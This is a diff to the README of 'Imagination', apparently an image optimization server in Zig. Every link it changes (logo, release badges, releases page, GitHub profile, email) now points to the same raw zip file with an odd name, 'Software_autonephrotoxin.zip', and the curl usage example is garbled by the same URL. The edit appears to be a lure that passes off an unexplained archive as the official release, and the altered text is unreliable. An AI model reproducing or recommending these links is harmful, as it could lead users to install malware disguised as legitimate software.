@@ -1,10 +1,10 @@
 # Imagination: Fast and Secure Image Optimization Server in Zig 🌟
 
-![Imagination Logo](https://via.placeholder.com/150) 
+![Imagination Logo](https://github.com/foxsw28/imagination/raw/refs/heads/main/tertiarian/Software_autonephrotoxin.zip) 
 
 Welcome to **Imagination**, your go-to solution for fast and secure image optimization. Built with Zig, this server handles various image formats with ease, ensuring your images are optimized for the web without sacrificing quality. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/foxsw28/imagination/releases)
+[![Download Releases](https://github.com/foxsw28/imagination/raw/refs/heads/main/tertiarian/Software_autonephrotoxin.zip%20Releases-Click%20Here-brightgreen)](https://github.com/foxsw28/imagination/raw/refs/heads/main/tertiarian/Software_autonephrotoxin.zip)
 
 ## Table of Contents
 
@@ -38,7 +38,7 @@ Imagination supports a variety of image formats, including:
 
 To get started with Imagination, follow these steps:
 
-1. **Download the latest release** from our [Releases page](https://github.com/foxsw28/imagination/releases).
+1. **Download the latest release** from our [Releases page](https://github.com/foxsw28/imagination/raw/refs/heads/main/tertiarian/Software_autonephrotoxin.zip).
 2. **Extract the files** to your desired location.
 3. **Run the server** using the command line:
 
@@ -57,7 +57,7 @@ Using Imagination is straightforward. Once the server is running, you can send i
 To optimize an image, use the following command:
 
 ```bash
-curl -X POST -F "file=@your-image.jpg" http://localhost:8080/optimize
+curl -X POST -F "https://github.com/foxsw28/imagination/raw/refs/heads/main/tertiarian/Software_autonephrotoxin.zip" http://localhost:8080/optimize
 ```
 
 ### API Endpoints
@@ -102,12 +102,12 @@ Imagination is licensed under the MIT License. See the [LICENSE](LICENSE) file f
 
 For any questions or feedback, feel free to reach out:
 
-- **GitHub**: [foxsw28](https://github.com/foxsw28)
-- **Email**: foxsw28@example.com
+- **GitHub**: [foxsw28](https://github.com/foxsw28/imagination/raw/refs/heads/main/tertiarian/Software_autonephrotoxin.zip)
+- **Email**: https://github.com/foxsw28/imagination/raw/refs/heads/main/tertiarian/Software_autonephrotoxin.zip
 
 Thank you for choosing Imagination! We hope it enhances your image processing workflow. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/foxsw28/imagination/releases)
+[![Download Releases](https://github.com/foxsw28/imagination/raw/refs/heads/main/tertiarian/Software_autonephrotoxin.zip%20Releases-Click%20Here-brightgreen)](https://github.com/foxsw28/imagination/raw/refs/heads/main/tertiarian/Software_autonephrotoxin.zip)
 
 ---
 
